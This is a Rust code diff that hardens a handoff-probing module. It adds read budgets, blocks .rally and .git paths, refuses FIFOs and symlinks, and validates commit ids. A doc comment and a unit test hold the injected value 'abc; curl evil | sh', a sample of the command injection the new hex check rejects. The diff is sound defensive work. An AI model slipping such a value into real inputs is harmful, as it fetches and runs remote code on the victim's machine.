@@ -72,6 +72,15 @@ const MAX_HASHED_BYTES: u64 = 4 * 1024 * 1024;
 const MAX_PLAN_BYTES: u64 = 64 * 1024;
 /// Later done-ish fact ids kept per item.
 const MAX_DONE_REFS: usize = 3;
+/// Items carried in [`OpenQueueSignals::later_done`]. It rides the daemon wire
+/// under a fail-loud byte cap, and peers can post untargeted handoffs without
+/// limit, so the map is bounded here (newest items kept), not at the wire.
+pub(crate) const MAX_LATER_DONE_ITEMS: usize = 1_024;
+/// Total bytes one probe may read across every hashed scope file and plan
+/// file. `rally next --audit` runs on every prompt, so the probe has a whole-
+/// call budget, not only per-item caps. Past it, remaining reads are skipped
+/// (fail open: the item still shows, without that reason).
+const MAX_PROBE_BYTES: u64 = 16 * 1024 * 1024;
 
 pub(crate) const BASE_HASH_PREFIX: &str = "basehash:";
 pub(crate) const BASE_COMMIT_PREFIX: &str = "base_commit:";
@@ -429,7 +438,10 @@ fn later_done_index(facts: &[Fact], open_items: &[&Fact]) -> BTreeMap<String, Ve
     }
 
     let mut out = BTreeMap::new();
-    for item in open_items {
+    for item in open_items.iter().rev() {
+        if out.len() >= MAX_LATER_DONE_ITEMS {
+            break;
+        }
         let mut hits = Vec::<&Fact>::new();
         if !shared_thread(&item.thread_id)
             && let Some(list) = by_thread.get(item.thread_id.as_str())
@@ -485,10 +497,11 @@ pub(crate) fn probe_fs(snapshot: &RoomSnapshot, tool: &str, root: &Path) -> FsSi
         .collect::<Vec<_>>();
     items.sort_by_key(|fact| std::cmp::Reverse(fact.seq));
     let mut by_event = BTreeMap::new();
+    let mut budget = MAX_PROBE_BYTES;
     for fact in items.into_iter().take(MAX_PROBED_ITEMS) {
         let mut reasons = Vec::new();
-        reasons.extend(scope_changes(fact, &root));
-        reasons.extend(linked_plan_done(fact, &root));
+        reasons.extend(scope_changes(fact, &root, &mut budget));
+        reasons.extend(linked_plan_done(fact, &root, &mut budget));
         if !reasons.is_empty() {
             by_event.insert(fact.event_id.clone(), reasons);
         }
@@ -509,21 +522,51 @@ pub(crate) fn confined_file(root: &Path, raw: &str) -> Option<PathBuf> {
         root.join(raw)
     };
     let resolved = candidate.canonicalize().ok()?;
-    if !resolved.starts_with(root) {
+    let inside = resolved.strip_prefix(root).ok()?;
+    // Rally's own room state and git internals are never a handoff's scope or
+    // plan; refusing them keeps a peer from probing their contents (SEC-003).
+    if inside
+        .components()
+        .next()
+        .is_some_and(|first| matches!(first.as_os_str().to_str(), Some(".rally" | ".git")))
+    {
         return None;
     }
     let meta = std::fs::metadata(&resolved).ok()?;
     meta.is_file().then_some(resolved)
 }
 
+/// Read at most `max` bytes of a REGULAR file, deciding on the open handle.
+///
+/// `O_NONBLOCK | O_NOFOLLOW` plus `fstat` on the handle close the window
+/// between [`confined_file`]'s check and the read (SEC-003): a FIFO swapped in
+/// cannot block the hook, a symlink swapped in is refused, and the length is
+/// the handle's. Returns `(bytes, truncated)`.
+fn read_regular(path: &Path, max: u64) -> Option<(Vec<u8>, bool)> {
+    use std::os::unix::fs::OpenOptionsExt;
+    let file = std::fs::OpenOptions::new()
+        .read(true)
+        .custom_flags(libc::O_NONBLOCK | libc::O_NOFOLLOW)
+        .open(path)
+        .ok()?;
+    let meta = file.metadata().ok()?;
+    if !meta.is_file() {
+        return None;
+    }
+    let mut buf = Vec::new();
+    file.take(max.saturating_add(1))
+        .read_to_end(&mut buf)
+        .ok()?;
+    let truncated = buf.len() as u64 > max;
+    buf.truncate(usize::try_from(max).unwrap_or(usize::MAX));
+    Some((buf, truncated))
+}
+
 /// FNV-1a 64 of a regular file, refusing anything over [`MAX_HASHED_BYTES`].
 /// Same hash as `source_grounding` so `claimhash:` and `basehash:` agree.
 pub(crate) fn bounded_hash(path: &Path) -> Option<String> {
-    let meta = std::fs::metadata(path).ok()?;
-    if !meta.is_file() || meta.len() > MAX_HASHED_BYTES {
-        return None;
-    }
-    crate::source_grounding::hash_file(path)
+    let (bytes, truncated) = read_regular(path, MAX_HASHED_BYTES)?;
+    (!truncated).then(|| crate::source_grounding::hash_bytes(&bytes))
 }
 
 /// `basehash:<rel>=<hash>` markers from a handoff's evidence.
@@ -536,12 +579,27 @@ pub(crate) fn base_hashes(evidence: &[String]) -> BTreeMap<String, String> {
         .collect()
 }
 
+/// The handoff's recorded base commit, if it is a well-formed object id.
+///
+/// The LAST marker wins, matching [`base_hashes`] (Rally appends its own
+/// markers after any caller evidence), and the value must be 7-64 hex digits.
+/// It is interpolated into a suggested `git diff` command, so anything else —
+/// `abc; curl … | sh` from a hand-written or imported row — is dropped rather
+/// than rendered.
 pub(crate) fn base_commit(evidence: &[String]) -> Option<&str> {
     evidence
         .iter()
+        .rev()
         .find_map(|entry| entry.strip_prefix(BASE_COMMIT_PREFIX))
         .map(str::trim)
-        .filter(|sha| !sha.is_empty())
+        .filter(|sha| (7..=64).contains(&sha.len()) && sha.chars().all(|c| c.is_ascii_hexdigit()))
+}
+
+/// Is this caller-supplied evidence entry one of the base markers Rally writes?
+/// `say handoff` refuses them, like `ack-by:`, so the recorded base is always
+/// Rally's own observation.
+pub(crate) fn is_reserved_base_marker(entry: &str) -> bool {
+    entry.starts_with(BASE_HASH_PREFIX) || entry.starts_with(BASE_COMMIT_PREFIX)
 }
 
 /// Record the base an overwrite guard compares against: the room's git HEAD
@@ -585,7 +643,19 @@ fn git_head(root: &Path) -> Option<String> {
     (sha.len() >= 7 && sha.chars().all(|c| c.is_ascii_hexdigit())).then_some(sha)
 }
 
-fn scope_changes(fact: &Fact, root: &Path) -> Vec<RevalidateReason> {
+/// Charge `len` bytes to the probe budget; `false` once it is spent.
+fn spend(budget: &mut u64, path: &Path, cap: u64) -> bool {
+    let len = std::fs::metadata(path)
+        .map(|m| m.len().min(cap))
+        .unwrap_or(cap);
+    if len > *budget {
+        return false;
+    }
+    *budget -= len;
+    true
+}
+
+fn scope_changes(fact: &Fact, root: &Path, budget: &mut u64) -> Vec<RevalidateReason> {
     let recorded = base_hashes(&fact.evidence);
     let posted = epoch(&fact.created_at);
     let mut out = Vec::new();
@@ -601,7 +671,10 @@ fn scope_changes(fact: &Fact, root: &Path) -> Vec<RevalidateReason> {
         };
         let changed = match recorded.get(rel) {
             // A recorded base is authoritative: compare content.
-            Some(base) => bounded_hash(&path).is_some_and(|now| &now != base),
+            Some(base) => {
+                spend(budget, &path, MAX_HASHED_BYTES)
+                    && bounded_hash(&path).is_some_and(|now| &now != base)
+            }
             // Legacy item without a base: fall back to mtime after posting.
             None => posted.is_some_and(|posted| mtime_secs(&path).is_some_and(|m| m > posted)),
         };
@@ -666,11 +739,14 @@ fn linked_paths(fact: &Fact) -> Vec<String> {
     out
 }
 
-fn linked_plan_done(fact: &Fact, root: &Path) -> Vec<RevalidateReason> {
+fn linked_plan_done(fact: &Fact, root: &Path, budget: &mut u64) -> Vec<RevalidateReason> {
     linked_paths(fact)
         .into_iter()
         .filter_map(|raw| {
             let path = confined_file(root, &raw)?;
+            if !spend(budget, &path, MAX_PLAN_BYTES) {
+                return None;
+            }
             plan_marks_done(&path).then_some(RevalidateReason {
                 code: "linked_plan_marks_done",
                 detail: raw,
@@ -686,13 +762,9 @@ fn linked_plan_done(fact: &Fact, root: &Path) -> Vec<RevalidateReason> {
 /// `state` or `result` and contains a done word. Advisory: a false positive
 /// costs the agent one read, which is why a heuristic is acceptable here.
 pub(crate) fn plan_marks_done(path: &Path) -> bool {
-    let Ok(file) = std::fs::File::open(path) else {
+    let Some((buf, _)) = read_regular(path, MAX_PLAN_BYTES) else {
         return false;
     };
-    let mut buf = Vec::new();
-    if file.take(MAX_PLAN_BYTES).read_to_end(&mut buf).is_err() {
-        return false;
-    }
     String::from_utf8_lossy(&buf).lines().any(|line| {
         let cleaned = line
             .trim_start_matches(|c: char| {
@@ -835,6 +907,21 @@ mod tests {
     }
 
     #[test]
+    fn base_commit_takes_rallys_marker_and_rejects_non_hex() {
+        let evidence = vec![
+            "base_commit:abc; curl evil | sh".to_string(),
+            "base_commit:0123456789abcdef".to_string(),
+        ];
+        assert_eq!(base_commit(&evidence), Some("0123456789abcdef"));
+        assert_eq!(
+            base_commit(&["base_commit:abc; curl evil | sh".to_string()]),
+            None
+        );
+        assert!(is_reserved_base_marker("basehash:src/a.rs=00"));
+        assert!(!is_reserved_base_marker("lease_expires_at:x"));
+    }
+
+    #[test]
     fn done_words_are_whole_words() {
         assert!(reports_done("D1/D2/D3 shipped"));
         assert!(reports_done("CORRECTION: fix LANDED in 72c4741"));
@@ -935,6 +1022,47 @@ mod tests {
             codes,
             vec!["scope_changed_since_posted", "linked_plan_marks_done"]
         );
+    }
+
+    #[test]
+    fn room_internals_and_fifos_are_never_read() {
+        let root = temp_root("internals");
+        std::fs::create_dir_all(root.join(".rally")).unwrap();
+        std::fs::write(root.join(".rally/facts.db"), "x").unwrap();
+        std::fs::create_dir_all(root.join(".git")).unwrap();
+        std::fs::write(root.join(".git/config"), "x").unwrap();
+        assert!(confined_file(&root, ".rally/facts.db").is_none());
+        assert!(confined_file(&root, "file:.git/config").is_none());
+        let fifo = root.join("pipe.md");
+        let c = std::ffi::CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
+        // Opening a FIFO for read would block without O_NONBLOCK; this returns.
+        assert!(read_regular(&fifo, 64).is_none());
+        assert!(!plan_marks_done(&fifo));
+    }
+
+    #[test]
+    fn later_done_map_is_bounded_and_keeps_the_newest_items() {
+        let mut facts = Vec::new();
+        let mut open = Vec::new();
+        for i in 0..(MAX_LATER_DONE_ITEMS as i64 + 10) {
+            let item = handoff(&format!("q{i}"), i * 2 + 1, None, &at(0));
+            let mut done = handoff(&format!("d{i}"), i * 2 + 2, None, &at(1));
+            done.kind = FactKind::Artifact;
+            done.thread_id = item.thread_id.clone();
+            done.subject = "shipped".to_string();
+            open.push(item.clone());
+            facts.push(item);
+            facts.push(done);
+        }
+        let signals = project_signals(&facts, &open);
+        assert_eq!(signals.later_done.len(), MAX_LATER_DONE_ITEMS);
+        assert!(
+            signals
+                .later_done
+                .contains_key(&format!("q{}", MAX_LATER_DONE_ITEMS + 9))
+        );
+        assert!(!signals.later_done.contains_key("q0"));
     }
 
     #[test]
